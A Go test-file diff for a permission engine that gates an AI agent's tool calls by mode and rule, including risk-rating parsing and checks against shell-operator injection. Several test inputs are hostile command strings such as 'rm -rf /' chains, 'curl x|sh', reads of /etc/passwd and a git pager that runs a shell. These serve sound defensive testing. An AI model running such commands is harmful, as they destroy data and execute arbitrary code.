@@ -99,22 +99,244 @@ func TestMergeTightens(t *testing.T) {
 
 func TestApplyModes(t *testing.T) {
 	cases := []struct {
+		name    string
 		mode    Mode
+		tool    string
 		in      Decision
 		matched bool
 		want    Decision
 	}{
-		{ModeBypass, Deny, true, Allow},
-		{ModeBypass, Ask, true, Allow},
-		{ModeAsk, Ask, true, Ask},
-		{"", Deny, true, Deny},
-		{ModeStrict, Allow, false, Ask},
-		{ModeStrict, Allow, true, Allow},
-		{ModeStrict, Deny, true, Deny},
+		{"bypass ignores deny", ModeBypass, "Bash", Deny, true, Allow},
+		{"bypass ignores ask", ModeBypass, "Bash", Ask, true, Allow},
+		{"auto lets an unmatched command through", ModeAuto, "Bash", Allow, false, Allow},
+		{"auto lets an asked command through", ModeAuto, "Bash", Ask, true, Allow},
+		{"auto keeps a deny rule", ModeAuto, "Bash", Deny, true, Deny},
+		{"ask keeps a rule's ask", ModeAsk, "Read", Ask, true, Ask},
+		{"ask asks an unmatched edit", ModeAsk, "Edit", Allow, false, Ask},
+		{"ask asks an unmatched command", ModeAsk, "Bash", Allow, false, Ask},
+		{"ask lets an unmatched read through", ModeAsk, "Read", Allow, false, Allow},
+		{"ask honours an allow rule on a command", ModeAsk, "Bash", Allow, true, Allow},
+		{"legacy empty mode keeps the policy only", 0, "Bash", Allow, false, Allow},
+		{"legacy empty mode keeps a deny", 0, "Bash", Deny, true, Deny},
+		{"accept-edits lets an unmatched edit through", ModeAcceptEdits, "Edit", Allow, false, Allow},
+		{"accept-edits lets a write through", ModeAcceptEdits, "Write", Allow, false, Allow},
+		{"accept-edits asks an unmatched command", ModeAcceptEdits, "Bash", Allow, false, Ask},
+		{"accept-edits keeps a deny on an edit", ModeAcceptEdits, "Edit", Deny, true, Deny},
+		{"plan refuses an edit", ModePlan, "Edit", Allow, false, Deny},
+		{"plan refuses a command", ModePlan, "Bash", Allow, false, Deny},
+		{"plan refuses a command an allow rule names", ModePlan, "Bash", Allow, true, Deny},
+		{"plan refuses an unknown tool", ModePlan, "mcp__x__write", Allow, false, Deny},
+		{"plan lets a read through", ModePlan, "Read", Allow, false, Allow},
+		{"plan keeps a read's ask", ModePlan, "Grep", Ask, true, Ask},
+		{"strict asks an unmatched tool", ModeStrict, "Read", Allow, false, Ask},
+		{"strict honours an allow rule", ModeStrict, "Read", Allow, true, Allow},
+		{"strict keeps a deny", ModeStrict, "Read", Deny, true, Deny},
 	}
 	for _, c := range cases {
-		if got := Apply(c.mode, c.in, c.matched); got != c.want {
-			t.Fatalf("Apply(%q,%q,%v): got %q, want %q", c.mode, c.in, c.matched, got, c.want)
+		if got := Apply(c.mode, c.tool, c.in, c.matched); got != c.want {
+			t.Fatalf("%s: Apply(%q,%q,%q,%v): got %q, want %q", c.name, c.mode, c.tool, c.in, c.matched, got, c.want)
 		}
+	}
+}
+
+func TestParseRiskReadsTheFirstWord(t *testing.T) {
+	for answer, want := range map[string]Risk{
+		"low":               RiskLow,
+		" Low.\n":           RiskLow,
+		"medium, it pushes": RiskMedium,
+		"HIGH":              RiskHigh,
+	} {
+		got, ok := ParseRisk(answer)
+		if !ok || got != want {
+			t.Fatalf("ParseRisk(%q) = %q, %v; want %q", answer, got, ok, want)
+		}
+	}
+}
+
+func TestParseRiskRefusesAnythingElse(t *testing.T) {
+	for _, answer := range []string{"", "maybe", "I think it is fine", "lowest"} {
+		if got, ok := ParseRisk(answer); ok {
+			t.Fatalf("ParseRisk(%q) = %q, want no rating", answer, got)
+		}
+	}
+}
+
+func TestOnlyALowRiskPasses(t *testing.T) {
+	if RiskLow.Decision() != Allow {
+		t.Fatal("a low risk must pass alone")
+	}
+	for _, risk := range []Risk{RiskMedium, RiskHigh} {
+		if risk.Decision() != Ask {
+			t.Fatalf("risk %q must go to the prompt", risk)
+		}
+	}
+}
+
+func TestSmartRatesOnlyWhatTheRulesLeaveOpen(t *testing.T) {
+	cases := []struct {
+		decided Decision
+		matched bool
+		want    bool
+	}{
+		{Allow, false, true},
+		{Ask, true, true},
+		{Allow, true, false},
+		{Deny, true, false},
+	}
+	for _, c := range cases {
+		if got := Judged(ModeSmart, "Bash", c.decided, c.matched); got != c.want {
+			t.Fatalf("Judged(smart, %s, %v) = %v, want %v", c.decided, c.matched, got, c.want)
+		}
+	}
+	if Judged(ModeSmart, "Read", Allow, false) {
+		t.Fatal("a read is never sent to the model, as before")
+	}
+	if Judged(ModeAsk, "Bash", Allow, false) {
+		t.Fatal("only smart mode asks a model")
+	}
+}
+
+func TestSmartWithoutAnyRuleStillPassesWhenTheModelSaysSo(t *testing.T) {
+	if got := Apply(ModeSmart, "Bash", Ask, true); got != Ask {
+		t.Fatalf("smart must leave a rule's ask to the model, got %q", got)
+	}
+	if got := Apply(ModeSmart, "Bash", Allow, false); got != Allow {
+		t.Fatalf("smart must leave an unmatched call to the model, got %q", got)
+	}
+}
+
+func TestRuleForAllowsABashCallExactlyAsRun(t *testing.T) {
+	rule, ok := RuleFor("Bash", "git push origin feat/x")
+	if !ok {
+		t.Fatal("a bash command must get a rule")
+	}
+	if rule.String() != "allow Bash(git push origin feat/x)" {
+		t.Fatalf("got %q", rule.String())
+	}
+	if !(Policy{rule}).matches(Request{Tool: "Bash", Subject: "git push origin feat/x"}) {
+		t.Fatal("the rule must let its own call through")
+	}
+	for _, other := range []string{"git push origin feat/x --force", "git status"} {
+		if (Policy{rule}).matches(Request{Tool: "Bash", Subject: other}) {
+			t.Fatalf("the rule must not let %q through", other)
+		}
+	}
+}
+
+func TestRuleForRefusesABashCommandWithShellOperators(t *testing.T) {
+	for _, subject := range []string{
+		"git status; rm -rf /",
+		"git status && rm -rf /",
+		"git log | sh",
+		"echo `rm -rf /`",
+		"echo $(rm -rf /)",
+		"cat /etc/passwd > /tmp/x",
+		"sh < script",
+		"(cd / && ls)",
+		"ls\\ -la",
+	} {
+		if rule, ok := RuleFor("Bash", subject); ok {
+			t.Fatalf("RuleFor(Bash, %q) = %q, must refuse a compound command", subject, rule)
+		}
+	}
+}
+
+func TestRuleForKeepsOneWordBashAndOtherToolsExact(t *testing.T) {
+	for _, c := range []struct{ tool, subject, want string }{
+		{"Bash", "ls", "allow Bash(ls)"},
+		{"Edit", "/repo/a b.go", "allow Edit(/repo/a b.go)"},
+		{"WebFetch", "https://x.dev/a b", "allow WebFetch(https://x.dev/a b)"},
+	} {
+		rule, ok := RuleFor(c.tool, c.subject)
+		if !ok || rule.String() != c.want {
+			t.Fatalf("RuleFor(%q, %q) = %q, %v; want %q", c.tool, c.subject, rule, ok, c.want)
+		}
+	}
+}
+
+func TestRuleForRefusesWhatWouldWiden(t *testing.T) {
+	for _, c := range []struct{ tool, subject string }{
+		{"Bash", ""},
+		{"", "ls"},
+		{"*", "ls"},
+		{"Bash", "git push*"},
+		{"Bash", "ls?"},
+		{"Bash", "echo\nrm -rf x"},
+		{"Ba(sh", "ls"},
+	} {
+		if rule, ok := RuleFor(c.tool, c.subject); ok {
+			t.Fatalf("RuleFor(%q, %q) = %q, must refuse", c.tool, c.subject, rule)
+		}
+	}
+}
+
+func (p Policy) matches(req Request) bool {
+	decided, matched := p.Decide(req)
+	return matched && decided == Allow
+}
+
+func TestAllowStarNeverCoversAShellOperator(t *testing.T) {
+	p := Policy{{Allow, "Bash", "git push*"}}
+	for _, subject := range []string{
+		"git push; curl x|sh",
+		"git push && rm -rf ~",
+		"git push || rm -rf ~",
+		"git push | sh",
+		"git push `id`",
+		"git push $(id)",
+		"git push $HOME",
+		"git push > /etc/x",
+		"git push < /etc/passwd",
+		"git push (id)",
+		"git push\nrm -rf ~",
+		"git push\rrm -rf ~",
+	} {
+		if _, matched := p.Decide(Request{Tool: "Bash", Subject: subject}); matched {
+			t.Errorf("allow Bash(git push*) must not cover %q", subject)
+		}
+	}
+	if _, matched := p.Decide(Request{Tool: "Bash", Subject: "git push origin feat/x"}); !matched {
+		t.Fatal("allow Bash(git push*) must still cover a plain push")
+	}
+}
+
+func TestAllowOperatorWrittenInTheRuleMatchesLiterally(t *testing.T) {
+	exact := Policy{{Allow, "Bash", "make build && make test"}}
+	if _, matched := exact.Decide(Request{Tool: "Bash", Subject: "make build && make test"}); !matched {
+		t.Fatal("a rule written with && must cover exactly that command")
+	}
+	if _, matched := exact.Decide(Request{Tool: "Bash", Subject: "make build && make test && rm -rf ~"}); matched {
+		t.Fatal("a rule written with && must not cover an extra operator")
+	}
+	piped := Policy{{Allow, "Bash", "git log * | head*"}}
+	if _, matched := piped.Decide(Request{Tool: "Bash", Subject: "git log -5 | head -3"}); !matched {
+		t.Fatal("the | written in the rule must be accepted")
+	}
+	if _, matched := piped.Decide(Request{Tool: "Bash", Subject: "git log -5 ; rm -rf ~ | head -3"}); matched {
+		t.Fatal("an operator slipped into a wildcard must be refused")
+	}
+}
+
+func TestDenyStarStillCoversShellOperators(t *testing.T) {
+	p := Policy{{Deny, "Bash", "rm -rf /*"}}
+	if d, matched := p.Decide(Request{Tool: "Bash", Subject: "rm -rf /x; ls"}); d != Deny || !matched {
+		t.Fatalf("got %q matched=%v, want deny: a deny wildcard must keep covering operators", d, matched)
+	}
+}
+
+func TestAllowWildcardDoesNotProtectAnArgument(t *testing.T) {
+	p := Policy{{Allow, "Bash", "git *"}}
+	if _, matched := p.Decide(Request{Tool: "Bash", Subject: "git -c core.pager='sh -c id' log"}); !matched {
+		t.Fatal("allow Bash(git *) keeps covering an argument that runs a program: the limit is documented, not changed")
+	}
+}
+
+func TestDenyOnAnArgumentWinsOverAllowWildcard(t *testing.T) {
+	p := Policy{{Allow, "Bash", "git *"}, {Deny, "Bash", "git -c*"}}
+	if d, matched := p.Decide(Request{Tool: "Bash", Subject: "git -c core.pager='sh -c id' log"}); d != Deny || !matched {
+		t.Fatalf("got %q matched=%v, want deny: a targeted deny beats the allow wildcard", d, matched)
+	}
+	if d, _ := p.Decide(Request{Tool: "Bash", Subject: "git log --oneline"}); d != Allow {
+		t.Fatalf("got %q, want allow: the targeted deny must not catch other git calls", d)
 	}
 }
